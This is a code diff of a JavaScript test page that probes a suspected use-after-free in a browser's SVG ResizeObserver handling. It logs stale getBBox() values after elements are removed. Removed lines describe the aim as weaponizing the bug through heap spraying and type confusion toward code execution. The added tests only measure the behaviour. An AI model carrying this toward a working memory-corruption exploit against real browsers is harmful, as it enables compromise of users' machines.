-                if(!entry){ro.disconnect();safeResolve();return;}
-
-                // entry.target is now in svg2 — but RO was observing it in livesvg
-                let tgtW=null,tgtCrash=null;
-                try{const bb=entry.target.getBBox();tgtW=bb.width;}catch(ex){tgtCrash=ex.message.slice(0,40);}
-
-                // Is tgtW showing geometry from SVG-A (80) or SVG-B (different ctx)?
-                let crW=null;
-                try{crW=entry.contentRect?.width;}catch(ex){}
-
-                // What parent is entry.target in now?
-                let parentTag='?';
-                try{parentTag=entry.target.parentElement?.tagName||'none';}catch(ex){}
-
-                const isHit=(tgtW!==null&&tgtCrash)||(crW&&crW!==tgtW);
-                if(isHit){
-                    hit++;hitVals.push({t,tgtW,crW,parentTag,tgtCrash});
-                    log(`  t${t}: [HIT] tgtW=${tgtW} crW=${crW} parent=${parentTag} crash=${tgtCrash}`,'bad');
-                }else{
-                    miss++;
-                    if(t<4)log(`  t${t}: tgtW=${tgtW} crW=${crW} parent=${parentTag}`,'dim');
-                }
-
-                ro.disconnect();safeResolve();
-            });
-
-            try{ro.observe(observed);}
-            catch(ex){log(`  t${t}: observe fail: ${ex.message}`,'dim');safeResolve();}
-        });
-
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        while(svg2.firstChild)svg2.removeChild(svg2.firstChild);
-        await raf();
-    }
-
-    svg2.remove();
-    log(`\n[*] MOV: cbFired=${cbFired} hit=${hit} miss=${miss}`,(hit>0?'bad':'inf'));
-    if(hitVals.length)hitVals.slice(0,4).forEach(v=>log(`  tgtW=${v.tgtW} crW=${v.crW} parent=${v.parentTag}`,'bad'));
-
-    if(!q)dis(false);
-    return{cbFired,hit,miss};
-}
-
-// ── DBL: double-observe — second callback fires after first removes element ──
-// Two ROs observe the same element
-// First RO callback: remove element
-// Second RO callback: element already removed — reads stale ptr
-async function runDBL(q=false){
-    if(!q){dis(true);sep();log('▶ DBL: two ROs observe same element — second fires after first removes','inf');sep();}
-    log('[*] RO1 and RO2 both observe rect','inf');
-    log('[*] RO1 callback: remove rect → fires first','ok');
-    log('[*] RO2 callback: fires after — element already gone → stale?','bad');log('');
-
-    let hit=0,miss=0,ro1Fire=0,ro2Fire=0;
-    const hitVals=[];
-
-    for(let t=0;t<20;t++){
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();await raf();
-
-        const observed=mkRect(`dbl_r_${t}`,80,80);
-        livesvg.appendChild(observed);
-        await raf();await raf();
-
-        await new Promise(resolve=>{
-            let resolved=false;
-            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
-            setTimeout(safeResolve,600);
-
-            const ro2=new ResizeObserver((entries)=>{
-                ro2Fire++;
-                const entry=entries[0];
-                if(!entry){ro2.disconnect();safeResolve();return;}
-
-                // Read geometry — observed was removed by ro1
-                let tgtW=null,tgtCrash=null;
-                try{const bb=entry.target.getBBox();tgtW=bb.width;}catch(ex){tgtCrash=ex.message.slice(0,40);}
-                let crW=null;
-                try{crW=entry.contentRect?.width;}catch(ex){}
-                let inDom='?';
-                try{inDom=document.contains(entry.target)?'yes':'no';}catch(ex){}
-
-                const isHit=(tgtW!==null&&tgtW!==0)||(tgtCrash)||(crW&&crW!==0&&inDom==='no');
-                if(isHit){
-                    hit++;hitVals.push({t,tgtW,crW,inDom,tgtCrash});
-                    log(`  t${t}: [HIT ro2] tgtW=${tgtW} crW=${crW} inDom=${inDom} crash=${tgtCrash}`,'bad');
-                }else{
-                    miss++;
-                    if(t<4)log(`  t${t}: ro2 tgtW=${tgtW} crW=${crW} inDom=${inDom}`,'dim');
-                }
-
-                ro2.disconnect();safeResolve();
-            });
-
-            const ro1=new ResizeObserver(()=>{
-                ro1Fire++;
-                // Remove observed immediately when ro1 fires
-                try{observed.remove();}catch(ex){}
-                ro1.disconnect();
-                // ro2 callback should fire soon after (already queued or re-queued)
-                // If not queued, force a layout observation
+                // TICK — setTimeout(0)
                 setTimeout(()=>{
-                    if(!resolved){
-                        // ro2 may not have fired — check
-                        safeResolve();
-                    }
-                },200);
-            });
+                    try{reads.tick=r.getBBox().width;}catch(e){reads.tick='ERR';}
+                },0);
 
-            try{
-                ro1.observe(observed);
-                ro2.observe(observed);
-            }catch(ex){log(`  t${t}: observe fail: ${ex.message}`,'dim');safeResolve();}
+                // RAF — next animation frame
+                requestAnimationFrame(()=>{
+                    try{reads.raf=r.getBBox().width;}catch(e){reads.raf='ERR';}
+                    // All reads done
+                    Object.keys(timings).forEach(k=>timings[k].push(reads[k]));
+                    log(`  t${t}: sync=${reads.sync} micro=${reads.micro} tick=${reads.tick} raf=${reads.raf}`,
+                        (reads.sync!==0||reads.micro!==0?'bad':'dim'));
+                    ro.disconnect();safeResolve();
+                });
+            });
+            try{ro.observe(r);}catch(ex){safeResolve();}
         });
 
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
         await raf();
     }
 
-    log(`\n[*] DBL: ro1Fire=${ro1Fire} ro2Fire=${ro2Fire} hit=${hit} miss=${miss}`,(hit>0?'bad':'inf'));
-    if(hitVals.length)hitVals.slice(0,4).forEach(v=>log(`  tgtW=${v.tgtW} crW=${v.crW} inDom=${v.inDom}`,'bad'));
-    if(hit>0)log(`[+] DOUBLE-OBSERVE UAF: second RO reads freed element!`,'bad');
+    // Summarize window
+    const syncNon0=timings.sync.filter(v=>v!==0&&v!==null).length;
+    const microNon0=timings.micro.filter(v=>v!==0&&v!==null).length;
+    const tickNon0=timings.tick.filter(v=>v!==0&&v!==null).length;
+    const rafNon0=timings.raf.filter(v=>v!==0&&v!==null).length;
+    log(`\n[*] DEF window: sync=${syncNon0}/12 micro=${microNon0}/12 tick=${tickNon0}/12 raf=${rafNon0}/12`);
+    if(syncNon0>0&&microNon0===0)log(`[*] window = sync only (same RO callback tick)`,'inf');
+    if(syncNon0>0&&microNon0>0&&tickNon0===0)log(`[*] window = sync + microtask (RO delivery phase)`,'bad');
+    if(tickNon0>0)log(`[*] window extends past setTimeout — RO defers beyond event loop turn`,'bad');
 
     if(!q)dis(false);
-    return{ro1Fire,ro2Fire,hit,miss};
+    return{syncNon0,microNon0,tickNon0,rafNon0};
+}
+
+// ── ROI: isolated repro of v15 — confirm primitive is stable ─────────────
+async function runROI(q=false){
+    if(!q){dis(true);sep();log('▶ ROI: exact v15 repro — vary element sizes, confirm 100% repro','inf');sep();}
+    log('[*] remove inside RO callback → read entry.target.getBBox()','inf');
+    log('[*] vary W: 20,40,60,80,100,120 — does returned value match W?','ok');
+    log('[*] if yes → reading current RenderObject layout state (H2 or H3)','ok');log('');
+
+    const WIDTHS=[20,40,60,80,100,120];
+    const byWidth={};
+
+    for(const W of WIDTHS){
+        byWidth[W]={hit:0,miss:0,vals:[]};
+        for(let t=0;t<8;t++){
+            while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+            await raf();await raf();
+
+            const r=mkRect(`roi_${W}_${t}`,W,W);
+            livesvg.appendChild(r);
+            await raf();await raf();
+
+            await new Promise(resolve=>{
+                let resolved=false,phase=0;
+                const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
+                setTimeout(safeResolve,400);
+
+                const ro=new ResizeObserver((entries)=>{
+                    phase++;
+                    if(phase>1){ro.disconnect();safeResolve();return;}
+                    const entry=entries[0];
+
+                    // Remove inside callback
+                    try{r.remove();}catch(e){}
+
+                    let tgtW=null;
+                    try{tgtW=entry.target.getBBox().width;}catch(e){}
+                    let crW=null;
+                    try{crW=entry.contentRect?.width;}catch(e){}
+
+                    byWidth[W].vals.push(tgtW);
+                    if(tgtW===W){byWidth[W].hit++;}else{byWidth[W].miss++;}
+
+                    ro.disconnect();safeResolve();
+                });
+                try{ro.observe(r);}catch(ex){safeResolve();}
+            });
+
+            while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+            await raf();
+        }
+        const bw=byWidth[W];
+        log(`  W=${W}: hit=${bw.hit}/8 miss=${bw.miss}/8 vals=[${[...new Set(bw.vals)].join(',')}]`,(bw.hit>0?'bad':'dim'));
+    }
+
+    const totalHit=Object.values(byWidth).reduce((s,v)=>s+v.hit,0);
+    log(`\n[*] ROI: total hit=${totalHit}/${WIDTHS.length*8}`,(totalHit>0?'bad':'inf'));
+    if(totalHit===WIDTHS.length*8)log(`[+] 100% repro — RO callback preserves layout geometry for ALL sizes`,'bad');
+
+    if(!q)dis(false);
+    return{byWidth,totalHit};
+}
+
+// ── SEQ: full lifecycle trace inside RO callback ──────────────────────────
+async function runSEQ(q=false){
+    if(!q){dis(true);sep();log('▶ SEQ: step-by-step getBBox trace inside RO callback','inf');sep();}
+    log('[*] a=before remove b=after remove c=after mutate(999) d=after reinsert e=after 2nd remove','inf');
+    log('[*] full lifecycle to understand each state transition','ok');log('');
+
+    const seqResults=[];
+    for(let t=0;t<12;t++){
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();await raf();
+
+        const r=mkRect(`seq_${t}`,80,80);
+        livesvg.appendChild(r);
+        await raf();await raf();
+
+        await new Promise(resolve=>{
+            let resolved=false,phase=0;
+            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
+            setTimeout(safeResolve,400);
+
+            const ro=new ResizeObserver(()=>{
+                phase++;
+                if(phase>1){ro.disconnect();safeResolve();return;}
+
+                const seq={};
+
+                // a. before remove
+                try{seq.a=r.getBBox().width;}catch(e){seq.a='ERR';}
+
+                // b. after remove
+                try{r.remove();}catch(e){}
+                try{seq.b=r.getBBox().width;}catch(e){seq.b='ERR';}
+
+                // c. mutate width while removed (does getBBox update?)
+                r.setAttribute('width','999');
+                try{seq.c=r.getBBox().width;}catch(e){seq.c='ERR';}
+
+                // d. re-insert into DOM → new layout
+                livesvg.appendChild(r);
+                try{seq.d=r.getBBox().width;}catch(e){seq.d='ERR';}
+
+                // e. remove again (second remove)
+                r.remove();
+                try{seq.e=r.getBBox().width;}catch(e){seq.e='ERR';}
+
+                // f. re-mutate width while removed again
+                r.setAttribute('width','42');
+                try{seq.f=r.getBBox().width;}catch(e){seq.f='ERR';}
+
+                seqResults.push(seq);
+                const interesting=seq.b!==0||seq.c!==0||seq.e!==0;
+                log(`  t${t}: a=${seq.a} b=${seq.b} c=${seq.c} d=${seq.d} e=${seq.e} f=${seq.f}`,(interesting?'bad':'dim'));
+
+                ro.disconnect();safeResolve();
+            });
+            try{ro.observe(r);}catch(ex){safeResolve();}
+        });
+
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();
+    }
+
+    if(seqResults.length>0){
+        const s=seqResults[0];
+        log(`\n[*] SEQ first result: a=${s.a} b=${s.b} c=${s.c} d=${s.d} e=${s.e} f=${s.f}`,'inf');
+        // Interpretation
+        if(s.b===80&&s.c===80)log(`[*] b=c=80: remove+mutate doesn't change — stale RenderObject ptr (H2)`,'bad');
+        if(s.b===80&&s.c===999)log(`[*] b=80 c=999: reads ptr, but ptr is live and updates — H3 (deferred destroy)`,'inf');
+        if(s.b===0&&s.c===0)log(`[*] b=c=0: RO not protecting anything — v15 was JS cache (H1)`,'dim');
+        if(s.e===999)log(`[*] e=999: 2nd remove retains last layout value — JS cache confirmed`,'inf');
+        if(s.e===0)log(`[*] e=0: 2nd remove clears — only first remove has window`,'bad');
+    }
+
+    if(!q)dis(false);
+    return{seqResults};
 }
 
 async function runAll(){
     dis(true);clearLog();sep();
-    log('▶ SVG RO-window UAF v16 — weaponizing ResizeObserver async window','inf');sep();
-    log('[*] v15: tgtBBW=80 on 20/20 inside RO callback AFTER remove()','ok');
-    log('[*] v16: split remove() from callback — confirm true async window','ok');
-    log('[*] then spray freed slot → memory read primitive','ok');log('');
+    log('▶ SVG v17 — isolating RO getBBox primitive: cache vs stale ptr vs deferred','inf');sep();
+    log('[*] v15: getBBox()=80 inside RO callback after remove — 20/20','ok');
+    log('[*] question: is 80 a JS cache, a stale freed ptr (UAF), or deferred destroy?','ok');
+    log('[*] DEL test (resize to 123 then remove) is the decisive test','bad');log('');
     const R={};
     for(const[lbl,fn]of[
-        ['WIN_pre_remove',runWIN],
-        ['SPR_spray_freed',runSPR],
-        ['TYP_type_confusion',runTYP],
-        ['MOV_reparent',runMOV],
-        ['DBL_double_observe',runDBL],
+        ['CAC_baseline_cache',runCAC],
+        ['DEL_delta_resize',runDEL],
+        ['DEF_timing_window',runDEF],
+        ['ROI_isolated_repro',runROI],
+        ['SEQ_lifecycle_trace',runSEQ],
     ]){
         sep();log(`▶ ${lbl}`,'inf');sep();
         try{R[lbl]=await fn(true);}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
         log('');
     }
-    sep();log('▶ SUMMARY v16','inf');sep();
-    log('[*] WIN hit = pre-remove window confirmed = true async UAF exists','inf');
-    log('[*] SPR hit = heap spray landed = read/write primitive possible','inf');
-    log('[*] TYP crash/confused = vtable type confusion = code exec path','inf');
-    log('[*] MOV hit = cross-SVG reparent UAF','inf');
-    log('[*] DBL hit = double-observer UAF','inf');
+    sep();log('▶ SUMMARY v17 — interpretation key','inf');sep();
+    log('[*] CAC syncW≠0 → JS cache exists (getBBox benign outside RO too)','dim');
+    log('[*] CAC syncW=0 → v15 80 is RO-specific (either UAF or deferred)','inf');
+    log('[*] DEL got80   → STALE OLD PTR: pre-resize geometry = true UAF read','bad');
+    log('[*] DEL got123  → live ptr or JS cache (deferred or benign)','inf');
+    log('[*] DEF window extends past sync → RO delivery protects RenderObject','inf');
+    log('[*] SEQ b=c=80  → stale ptr (H2); b=80,c=999 → live deferred (H3)','inf');
     for(const[lbl,r]of Object.entries(R)){
-        if(r){
-            const h=(r.hit||r.confused||r.crash||0);
-            log(`  ${lbl}: ${JSON.stringify(r)}`,(h>0?'bad':'dim'));
-        }
+        if(r)log(`  ${lbl}: ${JSON.stringify(r).slice(0,120)}`,'dim');
     }
     sep();dis(false);
 }
